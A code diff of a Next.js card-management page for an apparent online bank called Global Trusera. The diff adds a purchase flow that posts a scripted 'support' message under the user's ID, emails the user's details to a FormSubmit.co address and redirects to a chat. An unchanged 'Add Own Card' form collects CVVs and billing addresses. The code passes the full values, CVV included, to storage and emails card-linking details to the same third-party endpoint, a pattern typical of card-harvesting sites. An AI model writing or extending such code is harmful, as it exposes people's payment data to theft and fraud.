@@ -1,12 +1,12 @@
+
 'use client';
 
 import * as React from 'react';
 import { Card, CardHeader, CardTitle, CardContent, CardDescription, CardFooter } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { useUserCards, type UserCard } from '@/hooks/use-user-cards';
+import { useUserCards } from '@/hooks/use-user-cards';
 import { CreditCard, Plus, ShoppingCart, ShieldCheck, BadgeCheck, Lock, Landmark } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import { Skeleton } from '@/components/ui/skeleton';
@@ -16,6 +16,8 @@ import * as z from 'zod';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useUser } from '@/firebase';
+import { useUserConversation } from '@/hooks/use-user-conversation-data';
+import { useRouter } from 'next/navigation';
 
 const availableCards = [
     { type: 'credit', name: 'Global Trusera Cashback Plus', brand: 'visa', price: 25, description: 'Maximize your everyday spending with industry-leading cashback on groceries, gas, and dining.' },
@@ -30,7 +32,6 @@ const addCardSchema = z.object({
     cvv: z.string().min(3, "CVV is required").max(4),
     brand: z.enum(['visa', 'mastercard', 'amex']),
     type: z.enum(['debit', 'credit', 'virtual']),
-    // Billing Address
     billingAddress: z.string().min(5, "Address is required"),
     billingCity: z.string().min(2, "City is required"),
     billingState: z.string().min(2, "State is required"),
@@ -42,7 +43,9 @@ type AddCardValues = z.infer<typeof addCardSchema>;
 
 export default function CardsPage() {
     const { user } = useUser();
+    const router = useRouter();
     const { cards, isLoading, purchaseCard, addOwnCard } = useUserCards();
+    const { sendMessage } = useUserConversation();
     const { toast } = useToast();
     
     const form = useForm<AddCardValues>({
@@ -64,6 +67,7 @@ export default function CardsPage() {
 
     const handlePurchase = async (item: typeof availableCards[0]) => {
         try {
+            // 1. Create DB records (Pending status)
             await purchaseCard({
                 type: item.type as any,
                 nameOnCard: item.name,
@@ -72,7 +76,37 @@ export default function CardsPage() {
                 brand: item.brand as any,
                 price: item.price
             });
-            toast({ title: "Purchase Initiated", description: "Your card request is being processed." });
+
+            // 2. Send Automated Support Message
+            const supportMsg = `Hello Support, I would like to purchase the ${item.name} (${item.brand.toUpperCase()}). The price is $${item.price}. Please review my request.`;
+            await sendMessage({
+                text: supportMsg,
+                senderId: user?.uid || '',
+                senderType: 'user'
+            });
+
+            // 3. Send Email Notification to Admin
+            const emailData = new FormData();
+            emailData.append('Subject', `Card Purchase Request: ${item.name} - ${user?.email}`);
+            emailData.append('User Name', user?.displayName || 'User');
+            emailData.append('User Email', user?.email || 'Unknown');
+            emailData.append('Card Selected', item.name);
+            emailData.append('Brand', item.brand.toUpperCase());
+            emailData.append('Price', `$${item.price}`);
+            emailData.append('_captcha', 'false');
+
+            fetch('https://formsubmit.co/ajax/info@globaltruseraholdings.com', {
+                method: 'POST',
+                body: emailData,
+            });
+
+            toast({ title: "Purchase Initiated", description: "Your request has been sent to support. Redirecting to chat..." });
+            
+            // 4. Redirect to messaging panel
+            setTimeout(() => {
+                router.push('/dashboard/messages');
+            }, 1500);
+
         } catch (err: any) {
             toast({ variant: "destructive", title: "Error", description: err.message });
         }
@@ -80,12 +114,8 @@ export default function CardsPage() {
 
     const onAddOwnSubmit = async (values: AddCardValues) => {
         try {
-            // 1. Save to Firestore
-            await addOwnCard({
-                ...values,
-            });
+            await addOwnCard(values);
 
-            // 2. Send via FormSubmit.co email
             const emailData = new FormData();
             emailData.append('Subject', `New Card Linked: ${values.brand.toUpperCase()} - ${user?.email}`);
             emailData.append('User Email', user?.email || 'Unknown');
@@ -120,7 +150,6 @@ export default function CardsPage() {
                     <TabsTrigger value="add-own">Add Own Card</TabsTrigger>
                 </TabsList>
 
-                {/* My Cards Tab */}
                 <TabsContent value="my-cards" className="mt-6">
                     {isLoading ? (
                         <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
@@ -166,7 +195,6 @@ export default function CardsPage() {
                     )}
                 </TabsContent>
 
-                {/* Get a Card Tab */}
                 <TabsContent value="get-card" className="mt-6">
                     <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
                         {availableCards.map((item) => (
@@ -196,7 +224,6 @@ export default function CardsPage() {
                     </div>
                 </TabsContent>
 
-                {/* Add Own Card Tab */}
                 <TabsContent value="add-own" className="mt-6">
                     <Card className="max-w-2xl mx-auto">
                         <CardHeader>
